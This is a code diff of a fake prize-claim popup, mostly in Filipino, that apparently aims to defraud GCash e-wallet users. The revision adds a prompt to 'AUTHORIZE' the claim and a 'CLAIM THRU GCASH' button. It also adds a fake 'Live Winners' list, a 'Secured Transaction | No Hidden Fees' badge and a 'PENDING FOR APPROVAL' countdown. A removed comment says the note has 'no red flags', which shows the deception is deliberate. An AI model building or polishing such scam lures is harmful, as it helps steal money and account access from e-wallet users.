@@ -77,13 +77,9 @@
         </div>
     </div>
 
-    <!-- ========== REMASTERED CLAIM POPUP (NEW) ========== -->
+    <!-- ========== REVISED CLAIM POPUP ========== -->
     <div id="claimPopup" class="claim-popup-overlay">
         <div class="claim-popup-card">
-            <!-- OK Circle with neon glow -->
-            <div class="ok-circle">
-                <span>OK</span>
-            </div>
             
             <h2>🎉 CONGRATULATIONS! 🎉</h2>
             
@@ -91,28 +87,40 @@
                 💎 YOU'RE A LUCKY WINNER! 💎
             </div>
             
-            <div class="prize-amount" id="popupPrizeAmount">
-                ₱0
+            <div class="prize-amount-wrapper">
+                <div class="prize-amount" id="popupPrizeAmount">
+                    ₱0
+                </div>
+                <div class="prize-underline"></div>
             </div>
             
             <div class="message">
-                <p>🎁 Ang iyong reward ay handa na para sa iyo!</p>
-                <p>I-click ang OK para i-claim ang iyong premyo.</p>
+                <p>Ang iyong mga panalo ay handa na para sa iyong eWallet.</p>
+                <p>Sa sandaling iyong <strong class="highlight">AUTHORIZE</strong> ang claim, ang iyong credits ay agad na maililipat.</p>
+                <p>Ang iyong pangalan ay lalabas sa <strong>Live Winners</strong> bilang patunay ng iyong panalo.</p>
             </div>
             
-            <!-- Simple note - walang red flags -->
             <div class="simple-note">
-                <p>⚡ Prize will be sent via GCash within 3-5 minutes ⚡</p>
+                <p>⚡ Kapag na-Authorize, automatic na mapupunta sa iyong GCash ang premyo ⚡</p>
             </div>
             
-            <!-- OK Claim Button -->
-            <button id="okClaimBtn" class="ok-claim-btn" onclick="onOKClaim()">
-                OK — CLAIM MY PRIZE
+            <button id="claimActionBtn" class="claim-action-btn" onclick="onClaimAction()">
+                💰 CLAIM THRU GCASH 💰
             </button>
             
             <div class="info-note">
                 🔒 Secured Transaction | No Hidden Fees
             </div>
+        </div>
+    </div>
+
+    <!-- ========== PENDING MODAL (COUNTDOWN) ========== -->
+    <div id="pendingModal" class="pending-overlay" style="display: none;">
+        <div class="pending-card">
+            <div class="pending-status">⏳ PENDING FOR APPROVAL ⏳</div>
+            <div class="pending-timer" id="pendingTimer">03:00</div>
+            <div class="pending-message">Prize will be available again after the time frame ends.</div>
+            <div class="pending-spinner"></div>
         </div>
     </div>
 
@@ -142,7 +150,6 @@
         
         rouletteIcon.addEventListener('click', () => {
             rouletteModal.style.display = 'flex';
-            // Sync jackpot status and balance after modal opens
             setTimeout(() => {
                 if (typeof window.syncRouletteJackpotStatus === 'function') {
                     window.syncRouletteJackpotStatus(window.rouletteJackpotLocked || false);
@@ -180,7 +187,6 @@
                 balanceText.innerText = "₱" + newBalance.toLocaleString() + ".00";
             }
             
-            // Sync to roulette if open
             if (typeof window.syncBalanceToRoulette === 'function') {
                 window.syncBalanceToRoulette();
             }
